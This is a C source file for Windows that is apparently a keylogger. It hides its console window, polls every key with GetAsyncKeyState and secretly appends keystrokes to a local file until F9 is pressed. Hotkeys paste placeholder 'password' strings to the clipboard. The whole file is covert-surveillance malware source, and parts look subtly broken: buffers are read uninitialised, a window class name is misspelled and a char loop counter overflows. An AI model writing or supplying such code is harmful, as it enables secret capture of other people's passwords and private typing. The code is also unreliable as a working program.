#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <time.h>
#include <conio.h>

FILE * IO_FILE;

int CaptureKeys(int key_stroke, char *file) {

    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    printf("\n%d",key_stroke);

    char my_str1[8];
    char my_str2[4];
    char my_str3[4];
    char my_str4[4];

    switch(key_stroke)
    {
        case 8:
            fprintf(IO_FILE, "%s", "[BACKSPACE]");
            break;
        case 13:
            fprintf(IO_FILE, "%s", "\n");
            break;
        case 32:
            fprintf(IO_FILE, "%s", " ");
            break;
        case VK_TAB:
            fprintf(IO_FILE, "%s", "[TAB]");
            break;
        case VK_SHIFT:
            fprintf(IO_FILE, "%s", "[SHIFT]");
            break;
        case VK_CONTROL:
            fprintf(IO_FILE, "%s", "[CONTROL]");
            strcpy(my_str1, "ctrl");
            break;
        case 71:
            fprintf(IO_FILE, "%s", "g");
            strcpy(my_str3, "g");
            break;
        case 77:
            fprintf(IO_FILE, "%s", "m");
            strcpy(my_str4, "m");
            break;
        case 81:
            fprintf(IO_FILE, "%s", "q");
            strcpy(my_str2, "q");
            break;
        case VK_ESCAPE:
            fprintf(IO_FILE, "%s", "[ESCAPE]");
            break;
        case VK_END:
            fprintf(IO_FILE, "%s", "[END]");
            break;
        case VK_HOME:
            fprintf(IO_FILE, "%s", "[HOME]");
            break;
        case VK_LEFT:
            fprintf(IO_FILE, "%s", "[LEFT]");
            break;
        case VK_UP:
            fprintf(IO_FILE, "%s", "[UP]");
            break;
        case VK_RIGHT:
            fprintf(IO_FILE, "%s", "[RIGHT]");
            break;
        case VK_CAPITAL:
            fprintf(IO_FILE, "%s", "[CAPSLOCK]");
            break;
        case VK_DOWN:
            fprintf(IO_FILE, "%s", "[DOWN]");
            break;
        case VK_F9:
            return(-1);
            break;
        default:
            fprintf (IO_FILE, "%s", &key_stroke);
    }

    int result = strcmp(my_str1, "ctrl");
    int result2 = strcmp(my_str2, "q");
    int result3 = strcmp(my_str3, "g");
    int result4 = strcmp(my_str4, "m");

    if (result == 0 && result2 == 0) {
        const char* output = "GooglePasswordIsHere";
        const size_t len = strlen(output) + 1;
        HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
        memcpy(GlobalLock(hMem), output, len);
        GlobalUnlock(hMem);
        OpenClipboard(0);
        EmptyClipboard();
        SetClipboardData(CF_TEXT, hMem);
        CloseClipboard();
        strcpy(my_str2, "");
        result2 = 0;
    }

    if (result == 0 && result3 == 0) {
        const char* output = "SecureKeyIsHere";
        const size_t len = strlen(output) + 1;
        HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
        memcpy(GlobalLock(hMem), output, len);
        GlobalUnlock(hMem);
        OpenClipboard(0);
        EmptyClipboard();
        SetClipboardData(CF_TEXT, hMem);
        CloseClipboard();
        strcpy(my_str3, "");
        result3 = 0;
    }

    if (result == 0 && result4 == 0) {
        const char* output = "MicrosoftPasswordIsHere";
        const size_t len = strlen(output) + 1;
        HGLOBAL hMem =  GlobalAlloc(GMEM_MOVEABLE, len);
        memcpy(GlobalLock(hMem), output, len);
        GlobalUnlock(hMem);
        OpenClipboard(0);
        EmptyClipboard();
        SetClipboardData(CF_TEXT, hMem);
        CloseClipboard();
        strcpy(my_str4, "");
        result4 = 0;
    }

    return 0;
}

void Flash() {
    HWND Flash;
    AllocConsole();
    Flash = FindWindowA("ConsoleWindowsClass", NULL);
    ShowWindow(Flash, 0);
}

int main() {
    Flash();
    IO_FILE = fopen("keyboarddat.txt", "a+");

    while(1) {
        Sleep(20);
        int flag = 0;

        if(kbhit()){
            for(char i = 8; i <= 177; i++) {
                if (GetAsyncKeyState(i) == -32767){
                    if(CaptureKeys(i, "keyboarddat.txt") == -1){
                        flag = 1;
                        break;
                    } 
                }
            }
        }

        if (flag == 1) {
            break;
        }

    }
    
    fclose(IO_FILE);
    return 0;
}
